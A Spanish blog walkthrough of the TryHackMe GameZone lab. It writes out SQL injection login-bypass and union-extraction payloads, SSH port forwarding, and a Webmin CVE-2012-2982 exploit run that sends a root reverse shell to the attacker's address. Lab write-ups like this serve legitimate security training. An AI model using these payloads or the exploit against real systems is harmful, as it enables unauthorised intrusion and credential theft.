---
layout: single
title: Máquina GameZone - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "La máquina GameZone nos permitirá practicar inyección SQL y será necesaria una enumeración bastante exhaustiva para poder escalar privilegios."
date: 2022-02-18
classes: wide
header:
  teaser: /assets/images/gamezone/portada.jpg
  teaser_home_page: true
categories:
  - THM
  - Blog
  - Writeup
tags:
  - SQLi
  - SSH
  - PortForwarding
  - Webmin
  - CVE-2012-2982
---

# Introducción
La máquina se encuentra en la plataforma [TryHackMe](https://tryhackme.com/room/gamezone). Las instrucciones para esta máquina son bastante claras y se resuelve de forma manual y con ayuda de metasploit. Solo revisaremos la forma manual. Esta guía se realizó sin seguir las instrucciones, por lo que verás pasos que no son necesarios, pero nos ayudarán a observar una metodología al momento de escalar privilegios.

Por cierto, al momento de estar realizando otra máquina diferente (la cual analizaremos en otra entrada) se murió mi sistema Kali, por lo que tuve que instalar otro. Hasta este momento había estado resolviendo las máquinas con la **Attack Machine** de TryHackMe, pero se me ocurrió la brillante idea de desempolvar mi Kali para resolver dicha máquina, muriendo en el proceso. Esta máquina y las siguientes se resolverán en mi nuevo sistema.

Te recomiendo revisar el script que realicé para dejar un sistema Kali vanilla listo para nuestras actividades de pentesting: [readyOS](https://github.com/blu3ming/readyOS). No está terminado y aún requiere actualizaciones, pero funciona para lo que necesitamos.

# Reconocimiento
La máquina tiene un sistema operativo Linux, lo cual podemos observar por medio de una traza ICMP.

![1]

Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap -sS --min-rate 5000 -p- --open -Pn -n 10.10.82.170 -oG allPorts

![2]

Vemos que se encuentran habilitados tanto el servicio SSH (22) como el HTTP (80).

Si realizamos un escaneo más exhaustivo en busca de servicios y versiones específicas de dichos puertos, nos encontramos con la siguiente información:

	nmap -sC -sV -p22,80 10.10.82.170 -oN targeted

![3]

No vemos información que sea relevante de momento, así que iniciaremos revisando el servicio **HTTP**.

# Servicio HTTP
La página web muestra un portal de videojuegos en cuya portada aparece el Agente 47 (aka Hitman). Es interesante cómo en varias máquinas tenemos información y referencias de la cultura popular que incluso son de relevancia al momento de resolver las máquinas, esta no es la excepción.

![4]

La página no es funcional, ninguno de los enlaces funciona salvo el panel de logueo. De hecho, si intentamos loguearnos con credenciales aleatorias, veremos que nos devuelve un "Incorrect login":

![5]

Dado que no contamos con información sobre un usuario, contraseña, o algún otro servicio el cual escanear en busca de más información, intentamos una inyección SQL:

    ' or 1=1-- -

Esta inyección nos permite bypasear el login y loguearnos como el primer usuario existente en la base de datos, usualmente el administrador. De hecho, lo recomendable es colocar dicha sentencia tanto en usuario como en contraseña. Como podemos observar, la página es vulnerable y nos permite acceder a un portal de búsqueda interno.

# SQL Injection

Dado que ya estamos con las inyecciones SQL, intentamos nuevamente una en esta entrada de texto. Primero probamos la clásica comilla simple:

![6]

Al ser una inyección de tipo **ERROR BASED**, podemos observar que la página devuelve un error en la consulta. A partir de ahora solo necesitamos enumerar la base de datos empleando consultas específicas.

Para comenzar esta enumeración, es necesario conocer el número de columnas con las que cuenta la tabla que estamos consultando. Para ello, empleamos la consulta:

    ' order by 100-- -

![7]

El número 100 es solo ilustrativo, ya que dificilmente nos encontraremos con una tabla que contenga dicho número de columnas. Este número deberá ir decreciendo hasta que el sistema no nos devuelva error. Se recomienda hacerlo de 10 hacia atrás, o incluso hacia adelante:

    ' union select 1,2,3-- -

![8]

Cuando el sistema no devuelve error alguno e imprime los números de la consulta en pantalla, podemos decir que hemos encontrado el número correcto de columnas. Ahora, deberemos emplear alguno de dichos números para imprimir la información que consultemos. Emplearemos la columna 3.

Primero enumeramos la base de datos en uso:

    ' union select 1,2,database()-- -

![9]

Cuando tengamos la base de datos, el siguiente paso es encontrar una tabla que sea de interés; normalmente, aquella que contenga usuarios y contraseñas.

    ' union select 1,2,table_name from information_schema.tables where table_schema='db' limit 1,1-- -

El limit al final de la consulta podemos modificarlo para enumerar tabla por tabla. Esto se puede hacer modificando el primer número desde 0 en adelante. Es decir, "limit 0,1", "limit 1,1", etc.

![10]

Como podemos observar, la tabla se llama **users**. Es un excelente punto donde comenzar. El siguiente paso es enumerar las columnas con las que cuenta la tabla y que contengan tanto nombres de usuario como contraseñas.

    ' union select 1,2,column_name from information_schema.columns where table_name='users' limit 0,1-- -

1. Cuando el limit está establecido en 0,1 obtenemos la primera columna, la cual es **username**
2. Cuando el limit está establecido en 1,1 obtenemos la segunda columna, la cual es **pwd**

![11]

![12]

Si continuamos enumerando columnas, veremos que ya no son de relevancia, así que nos podemos quedar solo con las primeras dos.

![13]

El último paso de esta enumeración manual de la base de datos es obtener los datos finales de cada columna. Para ello, la consulta cambia un poco:

    ' union select 1,2,group_concat(username,0x3a,pwd) from users-- -

**Group_concat** nos permitirá obtener dos datos en una sola consulta (en este caso, username y pwd) separados por un símbolo de ":" (0x3a en hexadecimal).

![14]

Vemos que hay un usuario llamado **agent47** (ah, ya toma sentido la imágen de portada en el sitio web) y una contraseña hasheada. Para descifrarla, la colocamos en el sitio web [Crackstation](https://crackstation.net/).

![15]

La contraseña es **videogamer124**.

# SSH
Dado que el sistema solo cuenta con un puerto SSH y un puerto HTTP, solo nos queda un servicio donde probar las nuevas credenciales que hemos obtenido. Nos logueamos al sistema remoto:

    ssh agent47@10.10.82.170

Vemos que las credenciales son correctas:

![16]

Obtenemos la flag de usuario y ya estamos listos para comenzar la etapa de escalada de privilegios.

![17]

# Escalada de privilegios
La máquina cuenta con un sistema Linux, por lo que podemos revisar varios vectores de ataque posibles. Primero, vemos si contamos con algún permiso **sudo** en el sistema (sudoers).
	
![18]

Como podemos observar, no podemos ejecutar dicho comando en el sistema, por lo que no hay nada que hacer en este vector. Lo siguiente que buscaría serían binarios **SUID**.

    find / -perm -u=s 2>/dev/null

![19]

La consulta nos devuelve un listado de binarios SUID con los que cuenta el sistema. Por desgracia, todos los los binarios típicos de cualquier sistema Linux y no hay algo fuera de lo común. Incluso llegue a pensar en comprometer la máquina por la nueva vulnerabilidad [**PwnKit**](https://www.zdnet.com/article/major-linux-policykit-security-vulnerability-uncovered-pwnkit/), pero esta requiere que la máquina cuente con **gcc**, y no es el caso.

Enumeramos **capabilities** en el sistema:

    getcap -r / 2>/dev/null

![20]

Por desgracia, tampoco encontramos nada de utilidad. Enumeramos ahora por tareas **cron**:

    cat /etc/crontab

![21]

**NADA**. Para este punto comenzaba a desesperarme, jaja, así que decidí sacar la artillería pesada y correr un **LinPEAS** para enumerar de manera automática y ver si había algo que haya omitido (que tampoco es como que mi enumeración manual haya sido muy exhaustiva).

Luego de revisar toda la salida del programa, me encontré con algo bastante curioso:

![22]

El sistema cuenta con varios puertos abiertos, el 22 que es el SSH, el 3306 que es MySQL (o la base de datos que comprometimos en la etapa de SQLi) y el 10000. Este último no figura en ningún lado, por lo que se considera entonces que solo está habilitado en la máquina servidor y no está expuesto hacia el exterior. Para poder realizar una enumeración de este puerto, requerimos traerlo a nuestra máquina para poder "exponerlo"; esto se lleva a cabo por medio de un proceso conocido como **Port Forwarding**.

# Port Forwarding
El Port Forwarding es el procedimiento mediante el cual traemos un puerto que solo esté disponible en la máquina servidor a nuestra máquina de atacante, de tal manera que queda "expuesto" y ahora forma parte de nuestros puertos; de esta manera, podemos escanearlo, enumerarlo e incluso comprometerlo.

Esto se puede hacer por medio de una herramienta llamada **Chisel**, sin embargo, si contamos con credenciales **SSH**, este procedimiento se puede hacer con dicha herramienta. Para ello, podemos ejecutar el siguiente comando:

    ssh -L PUERTO_DESTINO:IP_DESTINO:PUERTO_LOCAL USUARIO@IP

    ssh -L 10000:10.10.82.170:10000 agent47@10.10.82.170

![23]

Si ahora intentamos acceder a este puerto por medio de un navegador, veremos lo siguiente:

![24]

Esto es un error del port forwarding, y es que al parecer el servicio que corre en dicho puerto no acepta la IP como origen de la consulta (ni siquiera siendo la IP del servidor). Normalmente, la solución es solicitar la consulta por medio de un **localhost**. Para ello, debemos ejecutar nuevamente el port forwarding desde **SSH**.

    ssh -L 10000:localhost:10000 agent47@10.10.82.170

Obsérvese cómo ahora colocamos **localhost** en lugar de la IP destino.

![25]

Si volvemos a acceder al puerto por medio de un navegador, veremos que en esta ocasión nos encotramos ante un panel de logueo. Solo tenemos unas credenciales, las cuales nos ayudaron a acceder al sistema. Las probamos con la esperanza de que se trate de un caso de reutilización de contraseñas. Para nuestra suerte, así es:

    agent47:videogamer124

![26]

# CVE-2012-2982

El servicio se trata de un **Webmin 1.580**, el cual cuenta con una vulnerabilidad conocida como **CVE-2012-2982**.

![27]

El exploit disponible para explotar esta vulnerabilidad nos permitirá obtener una reverse shell como el usuario root si es que este usuario está corriendo el servicio. Si lo analizamos, veremos que cuenta con varias áreas de oportunidad, razón por la cual me tomé la libertad de tomar el [exploit original](https://github.com/OstojaOfficial/CVE-2012-2982) y mejorarlo para que la explotación sea más intuitiva.

Mi versión la puedes encontrar en este [repositorio](https://github.com/blu3ming/CVE-2012-2982), y en el **README** podrás encontrar todos los cambios que se realizaron (sería poco útil enunciar los cambios aquí).

Si ejecutamos únicamente el exploit, veremos que el mismo nos indica el órden de los datos de entrada que requiere. Este necesita la IP, el usuario del Webmin, la contraseña, la IP local donde enviará la reverse shell y, por supuesto, el puerto.

![28]

La IP del servicio, recordemos, es nuestro localhost (ya que hicimos el port forwarding y el puerto que corre en nuestra máquina es el mismo que en el servidor). Le damos al script los datos necesarios y lo ejecutamos, recordando poner primero una consola con netcat a la escucha.

    python exploit.py localhost agent47 videogamer124 10.13.14.131 443

![29]

Cuando ejecutamos el exploit, veremos que recibimos una consola en nuestro netcar, habiendo ganado acceso al sistema como root y pudiendo enumerar la flag de este usuario privilegiado.

![30]

[1]:/assets/images/gamezone/1.png
[2]:/assets/images/gamezone/2.png
[3]:/assets/images/gamezone/3.png
[4]:/assets/images/gamezone/4.png
[5]:/assets/images/gamezone/5.png
[6]:/assets/images/gamezone/6.png
[7]:/assets/images/gamezone/7.png
[8]:/assets/images/gamezone/8.png
[9]:/assets/images/gamezone/9.png
[10]:/assets/images/gamezone/10.png
[11]:/assets/images/gamezone/11.png
[12]:/assets/images/gamezone/12.png
[13]:/assets/images/gamezone/13.png
[14]:/assets/images/gamezone/14.png
[15]:/assets/images/gamezone/15.png
[16]:/assets/images/gamezone/16.png
[17]:/assets/images/gamezone/17.png
[18]:/assets/images/gamezone/18.png
[19]:/assets/images/gamezone/19.png
[20]:/assets/images/gamezone/20.png
[21]:/assets/images/gamezone/21.png
[22]:/assets/images/gamezone/22.png
[23]:/assets/images/gamezone/23.png
[24]:/assets/images/gamezone/24.png
[25]:/assets/images/gamezone/25.png
[26]:/assets/images/gamezone/26.png
[27]:/assets/images/gamezone/27.png
[28]:/assets/images/gamezone/28.png
[29]:/assets/images/gamezone/29.png
[30]:/assets/images/gamezone/30.png